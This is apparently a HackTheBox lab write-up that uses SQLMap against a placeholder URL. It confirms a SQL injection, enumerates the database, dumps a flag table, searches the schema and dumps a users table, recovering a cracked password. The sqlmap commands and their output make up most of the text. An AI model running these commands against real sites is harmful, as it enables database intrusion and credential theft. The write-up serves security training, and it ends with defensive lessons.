# HTB-Writeup-Database-Enumeration
HackTheBox Writeup: Database Enumeration leveraging SQLMap for advanced SQL injection exploitation, schema discovery, and targeted data exfiltration.

By Ramyar Danshgar 


## **Part 1: SQLMap Essentials**

### **Objective:** Extract the contents of the `flag1` table in the `testdb` database.

---

### **Step 1: Confirming SQL Injection Vulnerability**

The initial step was to identify and confirm the SQL injection vulnerability in the target URL (`http://www.example.com/?id=1`). This is the critical entry point for all subsequent exploitation.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1"
```

#### **What SQLMap Does:**
- **Injection Testing:** SQLMap attempts various payloads to test for SQLi, such as `id=1 AND 1=1` or UNION-based injections.
- **DBMS Identification:** It determines the database type (e.g., MySQL, PostgreSQL) to tailor queries.
- **Injection Type Discovery:** SQLMap reports whether the vulnerability is Boolean-based, UNION-based, or error-based.

#### **Output:**
```plaintext
[INFO] the back-end DBMS is MySQL
Parameter: id (GET)
Type: Boolean-based blind
Payload: id=1 AND 1=1
```

Confirming the SQLi vulnerability and understanding the database backend (MySQL) provides the foundation for further exploitation. The type of injection dictates the methods and payloads used for enumeration.

---

### **Step 2: Retrieving Basic Database Information**

With the vulnerability confirmed, the next step involved gathering metadata about the database environment, such as the version, current user, and active database.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

#### **What SQLMap Does:**
- **`--banner`:** Extracts the database version (useful for determining potential exploits).
- **`--current-user`:** Identifies the connected user to understand privilege levels.
- **`--current-db`:** Reveals the active database name.
- **`--is-dba`:** Checks if the user has administrative privileges.

#### **Output:**
```plaintext
banner: '5.1.41'
current user: 'root@%'
current database: 'testdb'
current user is DBA: True
```

This step establishes context, such as admin privileges (`root` user), which can expand the scope of exploitation. The database version (`5.1.41`) might reveal potential version-specific vulnerabilities.

---

### **Step 3: Enumerating Tables**

To identify data storage structures, I enumerated all tables within the active database (`testdb`).

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

#### **What SQLMap Does:**
- **`--tables`:** Lists all table names in the specified database.
- **`-D testdb`:** Targets the `testdb` database.

#### **Output:**
```plaintext
Database: testdb
[1 table]
+--------+
| flag1  |
+--------+
```

Identifying the `flag1` table enables targeted extraction of data.

---

### **Step 4: Dumping Table Contents**

With the `flag1` table identified, the contents were extracted to retrieve the flag.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T flag1 -D testdb
```

#### **What SQLMap Does:**
- **`--dump`:** Retrieves all rows and columns from the specified table.
- **`-T flag1`:** Focuses on the `flag1` table.
- **`-D testdb`:** Specifies the database to query.

#### **Output:**
```plaintext
Database: testdb
Table: flag1
[1 entry]
+----+----------------------------------------------+
| id | content                                      |
+----+----------------------------------------------+
| 1  | HTB{c0ngr4t5_y0u_und3rst00d_SQLMap_basics!} |
+----+----------------------------------------------+
```

Extracting table contents confirms successful exploitation and retrieves the flag: `HTB{c0ngr4t5_y0u_und3rst00d_SQLMap_basics!}`.

---

## **Part 2: Advanced Database Enumeration**

---

### **Step 1: Retrieving Database Schema**

Schema enumeration provides a detailed view of the database architecture, including tables and their columns.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

#### **Output:**
```plaintext
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+
```

Schema exploration reveals table structures and potential data storage locations, assisting in identifying high-value targets.

---

### **Step 2: Searching for Specific Data**

When databases contain numerous tables and columns, I used search queries to locate specific data points.

#### Example: Searching for Columns Containing "style"
```bash
sqlmap -u "http://www.example.com/?id=1" --search -C style
```

#### Output:
```plaintext
Database: information_schema
Table: ROUTINES
[1 column]
+-----------------+------------+
| Column          | Type       |
+-----------------+------------+
| PARAMETER_STYLE | varchar(8) |
+-----------------+------------+
```

Searching for keywords like "style" helps locate relevant columns quickly, improving efficiency during enumeration.

---

### **Step 3: Password Retrieval**

SQLMap can identify and retrival of password hashes using built-in dictionary attacks.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

#### **Output:**
```plaintext
Recognized possible password hashes in column 'password'
Retrieved password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
```

Retrieval of hashes highlights weak password policies, demonstrating how attackers can exploit such vulnerabilities.

---

## **Lessons Learned**

1. **Structured Workflow:**
   - Confirm vulnerability → Enumerate schema → Extract data → Perform targeted attacks.

2. **SQLMap:**
   - Features like `--schema`, `--search`, and hash-retrieval streamline enumeration.

3. **Privilege Awareness:**
   - Assessing admin rights (`--is-dba`) expands potential attack vectors, emphasizing the importance of least-privilege principles.

4. **Password Security:**
   - Weak passwords remain a critical risk. Stronger policies and encryption must be enforced.
